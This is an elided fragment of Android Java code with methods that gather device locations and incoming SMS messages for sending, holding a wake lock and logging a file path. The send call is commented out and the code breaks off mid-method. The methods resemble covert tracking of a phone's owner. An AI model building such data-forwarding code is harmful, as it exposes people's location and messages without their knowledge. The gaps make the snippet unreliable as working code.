...
//        result.append(";");
    ...
    static void sendLocationResults(final Context context, List<Location> locations) {
        ...
        Log.v("Sender", file.getAbsolutePath());
        ...
        final PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sender");
        wl.acquire();
        ...
        */
        //new SendDataTask().execute(locations.toArray(new Location[locations.size()]));
    }

    static void sendSmsResults(final Context context, SmsMessage[] smsMessages) {

        final SmsMessage[] sms2send = smsMessages;
